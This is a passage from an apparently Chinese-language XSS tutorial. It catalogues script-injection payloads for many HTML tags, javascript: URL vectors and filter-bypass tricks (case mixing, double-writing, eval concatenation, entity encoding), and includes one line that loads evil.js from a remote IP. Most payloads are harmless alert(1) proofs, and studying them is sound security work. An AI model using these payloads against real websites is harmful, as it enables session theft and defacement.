<h3 id="svg-标签"><a href="#svg-标签" class="headerlink" title="svg 标签"></a><a href="#svg-%E6%A0%87%E7%AD%BE" title="svg 标签"></a>svg 标签</h3><p><code>&lt;svg&gt;</code> 标签用来在HTML页面中直接嵌入SVG 文件的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;svg onload\&#x3D;alert(1);\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="select-标签"><a href="#select-标签" class="headerlink" title="select 标签"></a><a href="#select-%E6%A0%87%E7%AD%BE" title="select 标签"></a>select 标签</h3><p><code>&lt;select&gt;</code> 标签用来创建下拉列表。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;select onfocus\&#x3D;alert(1)\&gt;&lt;&#x2F;select\&gt;  </span><br></pre></td></tr></table></figure>
<p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;select onfocus\&#x3D;alert(1) autofocus\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="iframe-标签"><a href="#iframe-标签" class="headerlink" title="iframe 标签"></a><a href="#iframe-%E6%A0%87%E7%AD%BE" title="iframe 标签"></a>iframe 标签</h3><p><code>&lt;iframe&gt;</code> 标签会创建包含另外一个文档的内联框架。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;iframe onload\&#x3D;alert(1);\&gt;&lt;&#x2F;iframe\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a><a href="#video-%E6%A0%87%E7%AD%BE" title="video 标签"></a>video 标签</h3><p><code>&lt;video&gt;</code> 标签定义视频，比如电影片段或其他视频流。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;video\&gt;&lt;source onerror\&#x3D;alert(1)\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="audio-标签"><a href="#audio-标签" class="headerlink" title="audio 标签"></a><a href="#audio-%E6%A0%87%E7%AD%BE" title="audio 标签"></a>audio 标签</h3><p><code>&lt;audio&gt;</code> 标签定义声音，比如音乐或其他音频流。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;audio src\&#x3D;x  onerror\&#x3D;alert(1);\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="body-标签"><a href="#body-标签" class="headerlink" title="body 标签"></a><a href="#body-%E6%A0%87%E7%AD%BE" title="body 标签"></a>body 标签</h3><p><code>&lt;body&gt;</code> 标签定义文档的主体。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;body onload\&#x3D;alert(1);\&gt;  </span><br></pre></td></tr></table></figure>

<p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;body  </span><br><span class="line">2  onscroll&#x3D;alert(1);&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;br\&gt;&lt;input autofocus\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="textarea-标签"><a href="#textarea-标签" class="headerlink" title="textarea 标签"></a><a href="#textarea-%E6%A0%87%E7%AD%BE" title="textarea 标签"></a>textarea 标签</h3><p><code>&lt;textarea&gt;</code> 标签定义一个多行的文本输入控件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;textarea onfocus\&#x3D;alert(1); autofocus\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="keygen-标签"><a href="#keygen-标签" class="headerlink" title="keygen 标签"></a><a href="#keygen-%E6%A0%87%E7%AD%BE" title="keygen 标签"></a>keygen 标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;keygen autofocus onfocus\&#x3D;alert(1)\&gt; &#x2F;&#x2F;仅限火狐  </span><br></pre></td></tr></table></figure>

<h3 id="marquee-标签"><a href="#marquee-标签" class="headerlink" title="marquee 标签"></a><a href="#marquee-%E6%A0%87%E7%AD%BE" title="marquee 标签"></a>marquee 标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;marquee onstart\&#x3D;alert(1)\&gt;&lt;&#x2F;marquee\&gt; &#x2F;&#x2F;Chrome不行，火狐和IE都可以  </span><br></pre></td></tr></table></figure>

<h3 id="isindex-标签"><a href="#isindex-标签" class="headerlink" title="isindex 标签"></a><a href="#isindex-%E6%A0%87%E7%AD%BE" title="isindex 标签"></a>isindex 标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;isindex type\&#x3D;image src\&#x3D;1 onerror\&#x3D;alert(1)\&gt;&#x2F;&#x2F;仅限于IE  </span><br></pre></td></tr></table></figure>

<h2 id="利用-link-远程包含-JavaScript-文件"><a href="#利用-link-远程包含-JavaScript-文件" class="headerlink" title="利用 link 远程包含 JavaScript 文件"></a><a href="#%E5%88%A9%E7%94%A8-link-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB-JavaScript-%E6%96%87%E4%BB%B6" title="利用 link 远程包含 JavaScript 文件"></a>利用 link 远程包含 JavaScript 文件</h2><p><code>&lt;link&gt;</code> 标签定义文档与外部资源的关系。在无CSP的情况下才可以使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;link rel\&#x3D;import href\&#x3D;&quot;http:&#x2F;&#x2F;47.xxx.xxx.72&#x2F;evil.js&quot;\&gt;  </span><br></pre></td></tr></table></figure>

<h2 id="利用-JavaScript-伪协议"><a href="#利用-JavaScript-伪协议" class="headerlink" title="利用 JavaScript 伪协议"></a><a href="#%E5%88%A9%E7%94%A8-JavaScript-%E4%BC%AA%E5%8D%8F%E8%AE%AE" title="利用 JavaScript 伪协议"></a>利用 JavaScript 伪协议</h2><p><code>javascript:</code> 这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。当浏览器装载了这样的URL时，并不会转向某个URL，而是执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。</p>
<h3 id="a-标签"><a href="#a-标签" class="headerlink" title="a 标签"></a><a href="#a-%E6%A0%87%E7%AD%BE" title="a 标签"></a>a 标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;&quot;javascript:alert(1);&quot;\&gt;xss&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="iframe-标签-1"><a href="#iframe-标签-1" class="headerlink" title="iframe 标签"></a><a href="#iframe-%E6%A0%87%E7%AD%BE-1" title="iframe 标签"></a>iframe 标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;iframe src\&#x3D;javascript:alert(1);\&gt;&lt;&#x2F;iframe\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="img-标签-1"><a href="#img-标签-1" class="headerlink" title="img 标签"></a><a href="#img-%E6%A0%87%E7%AD%BE-1" title="img 标签"></a>img 标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;img src\&#x3D;x onerror\&#x3D;alert(1)\&gt;  </span><br><span class="line">2  &lt;img src\&#x3D;javascript:alert(1)\&gt;    &#x2F;&#x2F;IE7以下  </span><br></pre></td></tr></table></figure>

<h3 id="form-标签"><a href="#form-标签" class="headerlink" title="form 标签"></a><a href="#form-%E6%A0%87%E7%AD%BE" title="form 标签"></a>form 标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;form action\&#x3D;&quot;Javascript:alert(1)&quot;\&gt;&lt;input type\&#x3D;submit\&gt;  </span><br></pre></td></tr></table></figure>

<h1 id="XSS-常见绕过姿势"><a href="#XSS-常见绕过姿势" class="headerlink" title="XSS 常见绕过姿势"></a><a href="#XSS-%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF" title="XSS 常见绕过姿势"></a>XSS 常见绕过姿势</h1><p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/0.png"></p>
<h2 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a><a href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4" title="绕过空格过滤"></a>绕过空格过滤</h2><p>当空格被过滤了时，我们可以用 <code>/</code> 来代替空格：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;img&#x2F;src&#x3D;&quot;x&quot;&#x2F;onerror&#x3D;alert(1);&gt;  </span><br></pre></td></tr></table></figure>

<p>也可以：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;img&#x2F;src&#x3D;&quot;x&quot;onerror&#x3D;alert(1);&gt;  </span><br></pre></td></tr></table></figure>

<h2 id="绕过引号过滤"><a href="#绕过引号过滤" class="headerlink" title="绕过引号过滤"></a><a href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4" title="绕过引号过滤"></a>绕过引号过滤</h2><p>如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;img src\&#x3D;x onerror\&#x3D;alert(\&#96;xss\&#96;);&gt;  </span><br></pre></td></tr></table></figure>

<h2 id="绕过括号过滤"><a href="#绕过括号过滤" class="headerlink" title="绕过括号过滤"></a><a href="#%E7%BB%95%E8%BF%87%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4" title="绕过括号过滤"></a>绕过括号过滤</h2><p>当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;img src&#x3D;x onerror&#x3D;&quot;javascript:window.onerror&#x3D;alert;throw 1&quot;&gt;  </span><br><span class="line">2  &lt;a onmouseover&#x3D;&quot;javascript:window.onerror&#x3D;alert;throw 1&gt;  </span><br></pre></td></tr></table></figure>
<h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a><a href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4" title="绕过关键字过滤"></a>绕过关键字过滤</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a><a href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;sCRiPt\&gt;alert(1);&lt;&#x2F;sCrIpT\&gt;  </span><br><span class="line">2  &lt;ImG sRc\&#x3D;x onerRor\&#x3D;alert(1);\&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a><a href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87" title="双写绕过"></a>双写绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;scrscriptipt\&gt;alert(1);&lt;&#x2F;scrscriptipt\&gt; </span><br><span class="line">2  &lt;imimgg srsrcc\&#x3D;x onerror\&#x3D;alert(1);\&gt; </span><br></pre></td></tr></table></figure>
<h3 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87" title="字符串拼接绕过"></a>字符串拼接绕过</h3><h4 id="利用eval-函数"><a href="#利用eval-函数" class="headerlink" title="利用eval()函数"></a><a href="#%E5%88%A9%E7%94%A8eval-%E5%87%BD%E6%95%B0" title="利用eval()函数"></a>利用eval()函数</h4><p>与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;img src\&#x3D;&quot;x&quot; onerror\&#x3D;&quot;a&#x3D;&#39;aler&#39;;b&#x3D;&#39;t&#39;;c&#x3D;&#39;(1)&#39;;eval(a+b+c)&quot;\&gt;  </span><br><span class="line">2  &lt;img src\&#x3D;&quot;x&quot; onerror\&#x3D;&quot;a&#x3D;\&#96;aler\&#96;;b&#x3D;\&#96;t\&#96;;c&#x3D;&#39;(\&#96;xss\&#96;);&#39;;eval(a+b+c)&quot;\&gt;  </span><br><span class="line">3  &#x2F;&#x2F; 在js中，我们可以用反引号代替单双引号  </span><br></pre></td></tr></table></figure>
<h4 id="利用top"><a href="#利用top" class="headerlink" title="利用top"></a><a href="#%E5%88%A9%E7%94%A8top" title="利用top"></a>利用top</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;script\&gt;top\[&quot;al&quot;+&quot;ert&quot;\](\&#96;xss\&#96;);&lt;&#x2F;script\&gt;  </span><br><span class="line">2  &lt;script\&gt;top\[&quot;al&quot;+&quot;ert&quot;\](&quot;xss&quot;);&lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>

<h2 id="XSS-输出点总结"><a href="#XSS-输出点总结" class="headerlink" title="XSS 输出点总结"></a><a href="#XSS-%E8%BE%93%E5%87%BA%E7%82%B9%E6%80%BB%E7%BB%93" title="XSS 输出点总结"></a>XSS 输出点总结</h2><p>WAF最大的问题，在于不知道输出的位置，导致攻击者根据具体环境以及具体输出的标签类型便可以绕过。</p>
<h3 id="输出在属性里"><a href="#输出在属性里" class="headerlink" title="输出在属性里"></a><a href="#%E8%BE%93%E5%87%BA%E5%9C%A8%E5%B1%9E%E6%80%A7%E9%87%8C" title="输出在属性里"></a>输出在属性里</h3><p>例如输出的位置位于value属性中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;input value\&#x3D;&quot;...&quot; type\&#x3D;text\&gt;  </span><br></pre></td></tr></table></figure>
<p>我们可以选择直接闭合标签：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1  &quot;&gt;&lt;img src\&#x3D;x onerror\&#x3D;alert(1);\&gt; </span><br><span class="line">2 </span><br><span class="line">3  &#x2F;&#x2F; 输出后如下:  </span><br><span class="line">4  &#x2F;&#x2F; &lt;input value\&#x3D;&quot;&quot;\&gt;&lt;img src\&#x3D;x onerror\&#x3D;alert(1);\&gt;&quot; type&#x3D;text&gt;  </span><br></pre></td></tr></table></figure>
<p>如果 <code>&lt; &gt;</code> 被过滤的话可以换成选择仅闭合属性，并将后面的引号注释掉或闭合：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1  &quot; autofocus onfocus&#x3D;alert(1)&#x2F;&#x2F;  </span><br><span class="line">2  &quot; autofocus onfocus&#x3D;alert(1) &quot;  </span><br><span class="line">3  </span><br><span class="line">4  &#x2F;&#x2F; 输出后如下:  </span><br><span class="line">5  &#x2F;&#x2F; &lt;input value\&#x3D;&quot;&quot; autofocus onfocus\&#x3D;alert(1)&#x2F;&#x2F;&quot; type\&#x3D;text\&gt;  </span><br></pre></td></tr></table></figure>
<p>同样还有很多其他的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1  &quot; onmouseover&#x3D;prompt(0) x&#x3D;&quot;  </span><br><span class="line">2  &quot; onfocusin&#x3D;alert(1) autofocus x&#x3D;&quot;  </span><br><span class="line">3  &quot; onfocusout&#x3D;alert(1) autofocus x&#x3D;&quot;  </span><br><span class="line">4  &quot; onblur&#x3D;alert(1) autofocus a&#x3D;&quot;  </span><br></pre></td></tr></table></figure>
<h3 id="输出在HTML标签之间"><a href="#输出在HTML标签之间" class="headerlink" title="输出在HTML标签之间"></a><a href="#%E8%BE%93%E5%87%BA%E5%9C%A8HTML%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4" title="输出在HTML标签之间"></a>输出在HTML标签之间</h3><h3 id="输出在script标签之间"><a href="#输出在script标签之间" class="headerlink" title="输出在script标签之间"></a><a href="#%E8%BE%93%E5%87%BA%E5%9C%A8script%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4" title="输出在script标签之间"></a>输出在script标签之间</h3><p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;script\&gt;  </span><br><span class="line">2   var x &#x3D; &quot;input&quot;;  </span><br><span class="line">3  &lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>
<p>可控位置在input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1  &quot;;alert(1)&#x2F;&#x2F;  </span><br><span class="line">2  </span><br><span class="line">3  &#x2F;&#x2F; 输出后如下:  </span><br><span class="line">4  &#x2F;&#x2F; &lt;script\&gt;var x &#x3D; &quot;&quot;;alert(1)&#x2F;&#x2F;&quot;;&lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>
<h1 id="XSS-字符编码绕过"><a href="#XSS-字符编码绕过" class="headerlink" title="XSS 字符编码绕过"></a><a href="#XSS-%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87" title="XSS 字符编码绕过"></a>XSS 字符编码绕过</h1><p>在XSS中，还有一个绕过关键字过滤的方法，那就是字符编码绕过。这里给出一个编码网站：<a target="_blank" rel="noopener" href="https://bianma.bmcx.com/">https://bianma.bmcx.com/</a></p>
<p>编码属于计算机系统的基础知识，其内容写起来估计也可以出本书了，不过或多或少我们都有所了解，总的来说，编码就是将字符变为二进制数，而解码就是将二进制数还原为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程，下面大概介绍一下流程。</p>
<h2 id="请求网页解码流程"><a href="#请求网页解码流程" class="headerlink" title="请求网页解码流程"></a><a href="#%E8%AF%B7%E6%B1%82%E7%BD%91%E9%A1%B5%E8%A7%A3%E7%A0%81%E6%B5%81%E7%A8%8B" title="请求网页解码流程"></a>请求网页解码流程</h2><ul>
<li>  <strong>HTML 编码/解码</strong></li>
</ul>
<p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p>
<p>但是在HTML中有些字符是和关键词冲突的，比如 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是HTML标签，如果希望正确地显示预留字符，就需要在HTML中使用对应的HTML字符实体。</p>
<p>字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开头，后面跟着一个预定义的实体的名称，或用&amp;#开头+实体编号+分号来表示。</p>
<p>常见的HTML字符实体有：</p>
<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/1.png"></p>
<p>但并不是所有的字符都有实体名称，但是它们都有自己的实体编号。</p>
<p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 <code>&lt;</code> 符号（后面没有跟 <code>/</code>符号）就会进入 <strong>标签开始状态(Tag open state)</strong> ，然后转变到 <strong>标签名状态(Tag name state)</strong> 、 <strong>前属性名状态(before attribute name state)</strong> ……最后进入 <strong>数据状态(Data state)</strong> 并释放当前标签的token。当解析器处于 数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p>
<p>简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p>
<p>所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。</p>
<ul>
<li>  <strong>URL 解码</strong></li>
</ul>
<p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p>
<p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p>
<ul>
<li>  <strong>JavaScript 解码（只支持Unicode）</strong></li>
</ul>
<p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p>
<p>比如 <code>&lt;a href=&quot;javascript:alert(&#39;\u0031&#39;)&quot;&gt;test&lt;/a&gt;</code>，JavaScript 出发了 JavaScript 解释器，JavaScript 会先对内容进行解析，里边有一个转义字符<code>\u0031</code>，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为“1”，于是在完成 JavaScript 的解析之后变成了 <code>&lt;a href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;test&lt;/a&gt;</code>。</p>
<p><strong>下面用一个普通的XSS代码来说明一下浏览器对其解析的过程。</strong></p>
<ul>
<li>  <code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;test&lt;/a&gt;</code></li>
</ul>
<p>首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，如：<code>https://www.baidu.com</code>，那么URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为Javascript，因此该环境中最后一步Javascript解析器还会进行解码操作，最后解析的脚本将被执行。</p>
<p>整个解析顺序为3个环节：HTML解码 —&gt;URL解码 —&gt;JS解码</p>
<p>我们可以对XSS攻击向量做这三种编码都可以成功弹框。</p>
<h2 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a><a href="#HTML-%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81" title="HTML 实体编码"></a>HTML 实体编码</h2><p>我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML 编码主要分为10进制和16进制，格式为以 <code>&amp;#</code> 开头以分号 <code>;</code> 结尾（也可以不带分号）。</p>
<ul>
<li>  <code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1  &#x2F;&#x2F; 十进制 </span><br><span class="line">2  &lt;a href\&#x3D;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;\&gt;test&lt;&#x2F;a\&gt;  </span><br><span class="line">3  </span><br><span class="line">4  &#x2F;&#x2F; 十六进制  </span><br><span class="line">5  &lt;a href\&#x3D;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;\&gt;test&lt;&#x2F;a\&gt;  </span><br><span class="line">6  </span><br><span class="line">7  &#x2F;&#x2F; 也可以不带分号  </span><br><span class="line">8  &lt;a href\&#x3D;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29\&gt;test&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>
<ul>
<li>  <code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1  &#x2F;&#x2F; 十进制  </span><br><span class="line">2  &lt;img src\&#x3D;x onerror\&#x3D;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;\&gt;  </span><br><span class="line">3  </span><br><span class="line">4  &#x2F;&#x2F; 十六进制  </span><br><span class="line">5  &lt;img src\&#x3D;x onerror\&#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;\&gt;  </span><br><span class="line">6  </span><br><span class="line">7  &#x2F;&#x2F; 也可以不带分号  </span><br><span class="line">8  &lt;img src\&#x3D;x onerror\&#x3D;&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29\&gt;  </span><br></pre></td></tr></table></figure>
<p>但是要注意，对于HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 <code>&amp;#…</code> 形式解码，转化成对应的解码字符并被放入数据缓冲区中。</p>
<p><strong>（1）数据状态中的字符引用：</strong>数据状态就是解析一个标签内里面的内容，如 <code>&lt;div&gt;...&lt;/div&gt;</code> 中的内容，当浏览器解析完 <code>&lt;div&gt;</code> 标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了，如：</p>
